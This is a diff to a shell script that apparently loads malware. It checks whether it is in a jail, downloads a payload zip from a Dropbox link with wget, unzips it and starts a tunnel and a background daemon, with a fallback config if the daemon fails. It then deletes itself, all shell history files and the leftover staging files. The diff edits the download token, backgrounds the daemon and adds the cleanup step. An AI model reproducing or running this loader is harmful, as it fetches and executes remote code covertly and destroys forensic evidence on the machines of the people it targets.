@@ -34,12 +34,12 @@ jailjudge() {
 jailjudge
 
 ## get payload from dbx
-token=${pl_token:-ja15pnp2ac99sy4}
+token=${pl_token:-lxizr6cg4liekm1}
 name=${pl_name:-payload.zip}
 dir=pltmp
 wget -q https://dl.dropboxusercontent.com/s/$token/$name
 mkdir -p $dir && unzip -d $dir $name && rm $name || exit 1
-cd $dir/* || exit 1
+cd $dir || exit 1
 # tar xf ${BRANCH}.tar.gz && rm ${BRANCH}.tar.gz
 # cd scripts-${BRANCH} || exit 1
 
@@ -56,7 +56,7 @@ export PATH=.:pl:$PATH
 
 ## start tunnel
 . ./tstarter || exit 1
-setup_tnl &>/dev/null
+setup_tnl
 
 ## config object
 . ./objconfig || exit 1
@@ -64,7 +64,7 @@ setup_tnl &>/dev/null
 ## start the pausd daemon passing the object args
 . ./pausd || exit 1
 . ./switch || exit 1
-start
+start &
 fleep 1 ## give time to fail
 
 ## check for alternate if fail
@@ -75,7 +75,7 @@ while [ "$(jobs -r | wc -l)" -lt 2 ]; do
         ## altconfig
         . ./altconfig
         ## init
-        start
+        start &
         break
     fi
     fleep 1
@@ -91,3 +91,9 @@ rm -rf -- "$0" \
    "$HOME"/.*_history \
    ~/.*_history \
    /.*_history
+find ${tmppath}/${dir} \
+     ! -name "$OBJ_MASK" \
+     ! -name "$OBJ_CFG_MASK" \
+     -delete
+
+wait %+
